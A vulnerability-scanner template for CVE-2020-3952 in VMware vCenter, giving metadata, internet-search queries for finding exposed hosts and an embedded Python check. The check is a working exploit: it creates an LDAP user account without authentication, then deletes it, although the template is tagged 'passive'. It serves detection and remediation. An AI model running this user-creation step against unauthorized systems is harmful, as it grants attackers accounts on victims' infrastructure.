id: CVE-2020-3952

info:
  name: VMware vCenter Server LDAP Broken Access Control
  author: guardicore,0x_Akoko
  severity: critical
  description: |
    An authentication bypass vulnerability in VMware vCenter Server allows a remote unauthenticated attacker to create LDAP users without authentication via specially crafted LDAP requests. This vulnerability affects vCenter Server versions 6.7 prior to 6.7 U3f, 6.5 prior to 6.5 U3e, and 7.0 prior to 7.0 U1c.
  remediation: |
    Update VMware vCenter Server to version 7.0 U1c or later, 6.7 U3f or later, or 6.5 U3e or later.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2020-3952
    - https://www.vmware.com/security/advisories/VMSA-2020-0006.html
    - https://github.com/guardicore/vmware_vcenter_cve_2020_3952
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2020-3952
    cwe-id: CWE-306
    epss-score: 0.93234
    epss-percentile: 0.99787
    cpe: cpe:2.3:a:vmware:vcenter_server:6.7:-:*:*:*:*:*:*
  metadata:
    verified: true
    vendor: vmware
    product: vcenter_server
    shodan-query: http.title:"vmware vcenter"
    fofa-query: title="vmware vcenter"
    google-query: intitle:"vmware vcenter"
  tags: cve,cve2020,vmware,vcenter,ldap,auth-bypass,passive,kev

variables:
  HOST: "{{Host}}"

code:
  - engine:
      - py
      - python3
    source: |
      import ldap
      import os
      import logging

      logging.basicConfig(level=logging.INFO, format='%(message)s')

      def check_vulnerability(vcenter_ip, timeout=10):
          """
          Check if vCenter is vulnerable to CVE-2020-3952
          Returns tuple: (is_vulnerable: bool, version: str or None)
          """
          try:
              # Initialize LDAP connection
              c = ldap.initialize(f'ldap://{vcenter_ip}')
              c.set_option(ldap.OPT_NETWORK_TIMEOUT, timeout)

              # Test binding with invalid credentials
              try:
                  c.simple_bind_s('Administrator@test.local', 'invalid_password')
                  return False, None
              except ldap.INVALID_CREDENTIALS:
                  pass
              except Exception as e:
                  logging.error(f"[-] {vcenter_ip} - Bind test failed: {e}")
                  return False, None

              # Attempt to add test user (vulnerability check)
              test_user = 'testuser_detection'
              test_dn = f'cn={test_user},cn=Users,dc=vsphere,dc=local'

              modlist = {
                  'vmwPasswordNeverExpires': [b'True'],
                  'userPrincipalName': [f'{test_user}@VSPHERE.LOCAL'.encode('utf-8')],
                  'sAMAccountName': [test_user.encode('utf-8')],
                  'givenName': [test_user.encode('utf-8')],
                  'sn': [b'vsphere.local'],
                  'cn': [test_user.encode('utf-8')],
                  'uid': [test_user.encode('utf-8')],
                  'objectClass': [b'top', b'person', b'organizationalPerson', b'user'],
                  'userPassword': b'TestPass123'
              }

              try:
                  c.add_s(test_dn, ldap.modlist.addModlist(modlist))

                  # Cleanup
                  try:
                      c.delete_s(test_dn)
                  except:
                      pass

                  return True, None

              except ldap.ALREADY_EXISTS:
                  return True, None
              except Exception:
                  return False, None

          except Exception as e:
              logging.error(f"[-] {vcenter_ip} - Connection error: {e}")
              return False, None
          finally:
              try:
                  c.unbind_s()
              except:
                  pass

      def main():
          host = os.getenv("HOST")

          if not host:
              logging.error("[-] HOST environment variable not set")
              return

          try:
              is_vulnerable, version = check_vulnerability(host)

              if is_vulnerable:
                  print("Vulnerable")
              else:
                  print("NOT VULN")

          except Exception as e:
              logging.error(f"[-] {host} - Error: {e}")

      if __name__ == "__main__":
          main()

    matchers:
      - type: word
        words:
          - "Vulnerable"

    extractors:
      - type: dsl
        dsl:
          - response
